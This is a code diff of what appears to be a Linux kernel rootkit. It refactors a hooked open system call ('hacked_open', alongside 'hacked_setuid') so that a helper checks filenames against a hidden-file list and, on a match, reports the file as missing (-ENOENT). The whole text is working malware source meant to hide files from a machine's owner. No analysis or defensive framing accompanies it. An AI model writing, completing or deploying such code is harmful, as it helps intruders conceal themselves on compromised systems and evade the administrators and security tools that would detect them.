@@ -33,28 +33,23 @@ asmlinkage long hacked_setuid(uid_t uid)
     return ret;
 }
 
-// Intercepts open to see if the user is somehow trying
-// to open a file that we are hiding.
-asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode)
+bool should_hide_file(const char __user *filename)
 {
-    long ret;
     char *kern_buff = NULL;
     int i;
+    bool to_hide = false;
 
-    //DEBUG("Entered HACKED OPEN");
-    
-    ret  = (*orig_open)(filename, flags, mode);
     
     kern_buff = kzalloc(strlen_user(filename)+1, GFP_KERNEL);
     if(!kern_buff)
     {
-        DEBUG("RAN OUT OF MEMORY in CAT Filter");
+        DEBUG("RAN OUT OF MEMORY in FILE FILTER");
         goto cleanup;
     }
 
     if(copy_from_user(kern_buff, filename, strlen_user(filename)))
     {   
-        DEBUG("PROBLEM COPYING FILENAME FROM USER in CAT Filter");
+        DEBUG("PROBLEM COPYING FILENAME FROM USER in FILE Filter");
         goto cleanup;
     }
     
@@ -64,8 +59,7 @@ asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode
         // Hidden file is found
         if(strstr(kern_buff, HIDDEN_FILES[i]) != NULL)
         {
-            // Simulate no such file existing and return -1 as the result of open
-            ret = -ENOENT;
+            to_hide = true;
             break;
         }
     }
@@ -75,6 +69,21 @@ asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode
 cleanup:
     if(kern_buff)
         kfree(kern_buff);
+    return to_hide;
+}
+
+// Intercepts open to see if the user is somehow trying
+// to open a file that we are hiding.
+asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode)
+{
+    long ret;
+
+    ret  = (*orig_open)(filename, flags, mode);
+    if (should_hide_file(filename))
+    {
+        ret = -ENOENT;
+    } 
+
     return ret;
 }
 
